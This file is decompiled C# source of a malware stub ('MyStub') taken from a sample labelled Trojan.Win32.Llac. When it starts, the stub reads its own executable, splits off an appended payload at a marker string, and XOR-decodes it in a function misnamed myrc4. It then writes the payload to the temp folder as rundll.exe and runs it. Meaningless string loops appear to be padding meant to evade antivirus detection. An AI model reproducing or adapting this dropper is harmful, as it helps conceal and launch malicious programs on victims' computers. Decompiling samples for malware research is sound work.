// Decompiled with JetBrains decompiler
// Type: MyStub.Form1
// Assembly: MyStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 041479FB-7C35-4F47-8B18-82E64E7AA13B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.dawv-9cd215c400492271cdbae8322b2341bac1a8aa4988ad798d88080a8fa4316ace.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace MyStub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 267);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
label_3:
        num3 = 3;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 4;
        FileSystem.FileGet(1, ref Expression);
label_5:
        num3 = 5;
        int num4 = 1;
label_6:
        num3 = 6;
        string str1 = Conversions.ToString(Conversions.ToDouble(str1) + (double) num4);
label_7:
        num3 = 7;
        checked { ++num4; }
        if (num4 <= 50)
          goto label_6;
label_8:
        num3 = 8;
        FileSystem.FileClose(1);
label_9:
        num3 = 9;
        string[] strArray = Strings.Split(Expression, "<@mysplit@>");
label_10:
        num3 = 10;
        string str2 = Conversions.ToString(this.myrc4(strArray[1]));
label_11:
        num3 = 11;
        str1 = "i am ud ud ud who are you";
label_12:
        num3 = 12;
        FileSystem.FileOpen(1, Path.GetTempPath() + "rundll.exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_13:
        num3 = 13;
        FileSystem.FilePut(1, str2, -1L, false);
label_14:
        num3 = 14;
        str1 = "it is changed now, what happened to you";
label_15:
        num3 = 15;
        FileSystem.FileClose(1);
label_16:
        num3 = 16;
        Process.Start(Path.GetTempPath() + "rundll.exe");
label_17:
        num3 = 17;
        int num5 = 1;
label_18:
        num3 = 18;
        str1 += Conversions.ToString(num5);
label_19:
        num3 = 19;
        checked { ++num5; }
        if (num5 <= 50)
          goto label_18;
label_20:
        num3 = 20;
        this.Close();
        goto label_27;
label_22:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num6 = num2 + 1;
            num2 = 0;
            switch (num6)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private object myrc4(string mydata)
    {
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = mydata.Length;
      int num = 1;
      while (num <= length)
      {
        int CharCode = Strings.Asc(Conversions.ToChar(mydata.Substring(checked (num - 1), 1))) ^ 3;
        stringBuilder.Append(Strings.Chr(CharCode));
        checked { ++num; }
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return (object) str;
    }
  }
}
